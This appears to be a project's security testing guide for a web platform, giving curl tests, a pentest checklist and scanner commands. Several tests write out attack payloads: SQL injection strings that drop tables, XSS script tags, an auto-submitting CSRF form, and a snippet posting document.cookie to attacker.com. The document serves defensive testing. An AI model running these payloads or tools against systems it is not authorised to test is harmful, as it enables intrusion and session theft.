# Security Testing Guide

**Last Updated:** October 16, 2025  
**Version:** 1.0.0

## Overview

This document outlines comprehensive security testing procedures for the WriteCraft platform. Tests cover authentication, authorization, injection attacks, XSS, CSRF, session management, and more.

## Automated Security Tests

### 1. Authentication Tests

#### Test: Unauthenticated Access
```bash
# Should return 401 Unauthorized
curl -X GET https://writecraft.com/api/notebooks \
  -H "Content-Type: application/json" \
  -w "\nStatus: %{http_code}\n"

# Expected: 401 Unauthorized
```

#### Test: Expired Token
```bash
# Create expired session, then attempt access
curl -X GET https://writecraft.com/api/notebooks \
  -H "Cookie: connect.sid=expired_session" \
  -w "\nStatus: %{http_code}\n"

# Expected: 401 Unauthorized with "Session expired" message
```

#### Test: MFA Verification
```bash
# 1. Setup MFA
curl -X POST https://writecraft.com/api/auth/mfa/setup \
  -H "Cookie: connect.sid=valid_session" \
  -H "Content-Type: application/json"

# 2. Verify with invalid token
curl -X POST https://writecraft.com/api/auth/mfa/verify \
  -H "Cookie: connect.sid=valid_session" \
  -H "Content-Type: application/json" \
  -d '{"token": "000000"}'

# Expected: 400 Bad Request - Invalid MFA token
```

### 2. Authorization Tests

#### Test: Access Other User's Data
```bash
# Try to access notebook owned by different user
curl -X GET https://writecraft.com/api/notebooks/user-2-notebook-id \
  -H "Cookie: connect.sid=user-1-session" \
  -w "\nStatus: %{http_code}\n"

# Expected: 403 Forbidden
```

#### Test: Modify Other User's Project
```bash
# Try to update project owned by different user
curl -X PUT https://writecraft.com/api/projects/user-2-project-id \
  -H "Cookie: connect.sid=user-1-session" \
  -H "Content-Type: application/json" \
  -d '{"title": "Hacked!"}' \
  -w "\nStatus: %{http_code}\n"

# Expected: 403 Forbidden
```

#### Test: Delete Other User's Content
```bash
# Try to delete character owned by different user
curl -X DELETE https://writecraft.com/api/characters/user-2-character-id \
  -H "Cookie: connect.sid=user-1-session" \
  -w "\nStatus: %{http_code}\n"

# Expected: 403 Forbidden
```

### 3. SQL Injection Tests

#### Test: SQL Injection in Query Parameters
```bash
# Try SQL injection in search
curl -X GET "https://writecraft.com/api/search?q=test' OR '1'='1" \
  -H "Cookie: connect.sid=valid_session" \
  -w "\nStatus: %{http_code}\n"

# Expected: 400 Bad Request (sanitized) or safe query with escaped input
```

#### Test: SQL Injection in Request Body
```bash
# Try SQL injection in notebook creation
curl -X POST https://writecraft.com/api/notebooks \
  -H "Cookie: connect.sid=valid_session" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Test'; DROP TABLE notebooks; --",
    "description": "test"
  }' \
  -w "\nStatus: %{http_code}\n"

# Expected: Notebook created with sanitized title (special chars escaped)
```

#### Test: SQL Injection in User ID
```bash
# Try to inject SQL through userId
curl -X POST https://writecraft.com/api/notebooks \
  -H "X-Test-User-Id: test-user-123'; DROP TABLE users; --" \
  -H "Content-Type: application/json" \
  -d '{"title": "Test", "description": "test"}'

# Expected: 403 Forbidden (invalid test user ID format)
```

### 4. XSS (Cross-Site Scripting) Tests

#### Test: Stored XSS in Notebook Title
```bash
# Try to inject script in notebook title
curl -X POST https://writecraft.com/api/notebooks \
  -H "Cookie: connect.sid=valid_session" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "<script>alert('XSS')</script>",
    "description": "test"
  }'

# Verify: Title is sanitized when retrieved
curl -X GET https://writecraft.com/api/notebooks/{id} \
  -H "Cookie: connect.sid=valid_session"

# Expected: Script tags escaped or removed
```

#### Test: XSS in Rich Text Editor
```bash
# Try to inject malicious HTML
curl -X POST https://writecraft.com/api/projects/{id}/sections \
  -H "Cookie: connect.sid=valid_session" \
  -H "Content-Type: application/json" \
  -d '{
    "content": "<img src=x onerror=alert('XSS')>",
    "sectionType": "text"
  }'

# Expected: HTML sanitized by DOMPurify
```

#### Test: XSS via URL Parameters
```bash
# Try to inject script via URL
curl -X GET "https://writecraft.com/search?q=<script>alert('XSS')</script>" \
  -H "Cookie: connect.sid=valid_session"

# Expected: Input escaped in response
```

### 5. CSRF (Cross-Site Request Forgery) Tests

#### Test: POST Without CSRF Token
```bash
# Try to create notebook without CSRF token
curl -X POST https://writecraft.com/api/notebooks \
  -H "Cookie: connect.sid=valid_session" \
  -H "Content-Type: application/json" \
  -d '{"title": "Test", "description": "test"}' \
  -w "\nStatus: %{http_code}\n"

# Expected: Success (GET-based CSRF tokens not required for API)
# Note: If CSRF is enforced, should return 403
```

#### Test: State-Changing Operation from External Site
```html
<!-- Malicious site attempting CSRF -->
<form action="https://writecraft.com/api/notebooks" method="POST">
  <input name="title" value="Malicious">
  <input name="description" value="Created via CSRF">
</form>
<script>document.forms[0].submit();</script>

<!-- Expected: Blocked by SameSite cookie policy -->
```

### 6. Rate Limiting Tests

#### Test: Exceed Global Rate Limit
```bash
# Send 1001 requests rapidly (global limit: 1000/15min)
for i in {1..1001}; do
  curl -X GET https://writecraft.com/api/notebooks \
    -H "Cookie: connect.sid=valid_session" \
    -w "\nStatus: %{http_code}\n"
done

# Expected: First 1000 succeed, 1001st returns 429 Too Many Requests
```

#### Test: Exceed AI Generation Rate Limit
```bash
# Send 31 AI generation requests (limit: 30/15min)
for i in {1..31}; do
  curl -X POST https://writecraft.com/api/generator/character \
    -H "Cookie: connect.sid=valid_session" \
    -H "Content-Type: application/json" \
    -d '{"type": "fantasy"}' \
    -w "\nRequest $i Status: %{http_code}\n"
done

# Expected: First 30 succeed, 31st returns 429 Too Many Requests
```

#### Test: Failed Login Attempts (IDS)
```bash
# Attempt 6 failed logins (limit: 5 before block)
for i in {1..6}; do
  curl -X POST https://writecraft.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "test@example.com", "password": "wrong"}' \
    -w "\nAttempt $i Status: %{http_code}\n"
done

# Expected: First 5 return 401, 6th blocks IP for 24 hours
```

### 7. Session Security Tests

#### Test: Session Fixation Attack
```bash
# 1. Get session ID before login
SESSION_ID=$(curl -c - https://writecraft.com | grep connect.sid | awk '{print $7}')

# 2. Login with that session
curl -X POST https://writecraft.com/api/login \
  -H "Cookie: connect.sid=$SESSION_ID" \
  -d "..."

# Expected: New session ID generated after login (session.regenerate)
```

#### Test: Concurrent Session Limiting
```bash
# Login from 4 different devices (limit: 3)
curl -X POST https://writecraft.com/api/login -d "..." -c session1.txt
curl -X POST https://writecraft.com/api/login -d "..." -c session2.txt
curl -X POST https://writecraft.com/api/login -d "..." -c session3.txt
curl -X POST https://writecraft.com/api/login -d "..." -c session4.txt

# Try using first session
curl -X GET https://writecraft.com/api/notebooks -b session1.txt

# Expected: First session invalidated, only last 3 sessions work
```

#### Test: Session Hijacking via XSS
```javascript
// Try to steal session cookie via XSS
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>

// Expected: httpOnly cookie flag prevents access to document.cookie
```

### 8. Input Validation Tests

#### Test: Oversized Request Body
```bash
# Send request larger than 10MB limit
dd if=/dev/zero bs=1M count=11 | curl -X POST \
  https://writecraft.com/api/notebooks \
  -H "Cookie: connect.sid=valid_session" \
  -H "Content-Type: application/json" \
  --data-binary @- \
  -w "\nStatus: %{http_code}\n"

# Expected: 413 Payload Too Large
```

#### Test: Invalid Data Types
```bash
# Send string where number expected
curl -X POST https://writecraft.com/api/projects \
  -H "Cookie: connect.sid=valid_session" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Test",
    "notebookId": "not-a-number"
  }' \
  -w "\nStatus: %{http_code}\n"

# Expected: 400 Bad Request with validation error
```

#### Test: Missing Required Fields
```bash
# Send incomplete data
curl -X POST https://writecraft.com/api/notebooks \
  -H "Cookie: connect.sid=valid_session" \
  -H "Content-Type: application/json" \
  -d '{}' \
  -w "\nStatus: %{http_code}\n"

# Expected: 400 Bad Request with field errors
```

### 9. API Key Security Tests

#### Test: API Key Rotation Status
```bash
# Check if keys are properly tracked
curl -X GET https://writecraft.com/api/admin/key-rotation/status \
  -H "Cookie: connect.sid=admin_session"

# Expected: List of keys with last rotation dates
```

#### Test: Expired API Key Detection
```bash
# Check for keys older than 90 days
curl -X GET https://writecraft.com/api/admin/key-rotation/status \
  -H "Cookie: connect.sid=admin_session" | \
  jq '.keys[] | select(.daysUntilExpiry < 0)'

# Expected: Alert if any keys are expired
```

### 10. Security Headers Tests

#### Test: CSP Header Present
```bash
curl -I https://writecraft.com | grep -i content-security-policy

# Expected: CSP header with nonce-based policy
```

#### Test: HSTS Header (HTTPS Only)
```bash
curl -I https://writecraft.com | grep -i strict-transport-security

# Expected: max-age=31536000; includeSubDomains; preload
```

#### Test: X-Frame-Options
```bash
curl -I https://writecraft.com | grep -i x-frame-options

# Expected: DENY
```

#### Test: Cross-Origin Policies
```bash
curl -I https://writecraft.com | grep -i cross-origin

# Expected: All three CORP/COEP/COOP headers present
```

## Manual Security Testing

### Penetration Testing Checklist

#### 1. Authentication & Authorization
- [ ] Test login with invalid credentials
- [ ] Test password reset flow for vulnerabilities
- [ ] Verify MFA enforcement for admin accounts
- [ ] Test for privilege escalation
- [ ] Verify session timeout after inactivity
- [ ] Test remember-me functionality

#### 2. Injection Attacks
- [ ] SQL injection in all input fields
- [ ] NoSQL injection (if applicable)
- [ ] Command injection in file operations
- [ ] LDAP injection (if applicable)
- [ ] XML/XXE injection in file uploads

#### 3. XSS Attacks
- [ ] Reflected XSS in all parameters
- [ ] Stored XSS in all user input fields
- [ ] DOM-based XSS in client-side code
- [ ] XSS via file upload (SVG, HTML)

#### 4. CSRF Attacks
- [ ] Test state-changing operations without tokens
- [ ] Verify SameSite cookie attributes
- [ ] Test CSRF in API endpoints

#### 5. File Upload Security
- [ ] Test malicious file upload (exe, sh, php)
- [ ] Verify file type validation
- [ ] Test oversized file upload
- [ ] Check for directory traversal in filenames

#### 6. API Security
- [ ] Test rate limiting on all endpoints
- [ ] Verify API authentication
- [ ] Test for mass assignment vulnerabilities
- [ ] Check for information disclosure in errors

#### 7. Session Management
- [ ] Test session fixation
- [ ] Test concurrent session limiting
- [ ] Verify session invalidation on logout
- [ ] Test session hijacking resistance

#### 8. Business Logic
- [ ] Test for race conditions in critical operations
- [ ] Verify subscription tier enforcement
- [ ] Test AI usage quota limits
- [ ] Check for price manipulation

## Security Testing Tools

### 1. OWASP ZAP (Automated Scanner)
```bash
# Run automated security scan
docker run -t owasp/zap2docker-stable \
  zap-baseline.py -t https://writecraft.com
```

### 2. Burp Suite (Manual Testing)
- Configure browser proxy to localhost:8080
- Intercept and modify requests
- Test for injection, XSS, CSRF
- Analyze session tokens

### 3. SQLMap (SQL Injection)
```bash
# Test for SQL injection
sqlmap -u "https://writecraft.com/api/search?q=test" \
  --cookie="connect.sid=..." \
  --dbs
```

### 4. XSStrike (XSS Testing)
```bash
# Test for XSS vulnerabilities
python3 xsstrike.py -u "https://writecraft.com/search?q=XSS"
```

### 5. Nuclei (Vulnerability Scanner)
```bash
# Scan for known vulnerabilities
nuclei -u https://writecraft.com \
  -t cves/ -t vulnerabilities/
```

## Security Testing Results Template

```markdown
# Security Test Results - [Date]

## Executive Summary
- **Tests Performed:** [Number]
- **Vulnerabilities Found:** [Number]
- **Critical Issues:** [Number]
- **Overall Security Score:** [Score]/10

## Vulnerabilities Found

### Critical (P0)
1. **[Vulnerability Name]**
   - **Severity:** Critical
   - **Description:** [Details]
   - **Steps to Reproduce:** [Steps]
   - **Recommendation:** [Fix]

### High (P1)
...

### Medium (P2)
...

### Low (P3)
...

## Tests Passed
- [List of successful security tests]

## Recommendations
1. [Priority recommendation]
2. [Next recommendation]
3. ...

## Next Steps
- [ ] Fix critical vulnerabilities
- [ ] Re-test after fixes
- [ ] Update security documentation
- [ ] Schedule next security audit
```

## Continuous Security Testing

### CI/CD Integration
```yaml
# .github/workflows/security.yml
name: Security Tests

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Run npm audit
        run: npm audit --audit-level=moderate
      
      - name: Run OWASP Dependency Check
        run: dependency-check --project WriteCraft --scan .
      
      - name: Run Security Headers Check
        run: |
          curl -I https://staging.writecraft.com | \
          grep -E "Content-Security-Policy|X-Frame-Options|Strict-Transport-Security"
```

### Weekly Security Scans
```bash
#!/bin/bash
# weekly-security-scan.sh

echo "Running weekly security scan..."

# 1. NPM Audit
echo "1. NPM Audit..."
npm audit --json > audit-results.json

# 2. Security Headers Check
echo "2. Security Headers..."
curl -I https://writecraft.com > headers.txt

# 3. SSL/TLS Check
echo "3. SSL/TLS Check..."
nmap --script ssl-enum-ciphers -p 443 writecraft.com > ssl-check.txt

# 4. Send Report
echo "4. Sending report..."
./send-security-report.sh

echo "Security scan complete!"
```

## Post-Deployment Security Checklist

- [ ] All security headers present
- [ ] CSP nonce-based policy active
- [ ] Rate limiting functional
- [ ] MFA available for all users
- [ ] API key rotation tracking active
- [ ] IDS monitoring threats
- [ ] Session security hardened
- [ ] Input validation on all endpoints
- [ ] No secrets in code/logs
- [ ] HTTPS enforced
- [ ] Database backups configured
- [ ] Disaster recovery plan tested
- [ ] Security monitoring dashboards active
- [ ] Incident response plan documented

---

**Last Updated:** October 16, 2025  
**Next Security Audit:** January 16, 2026
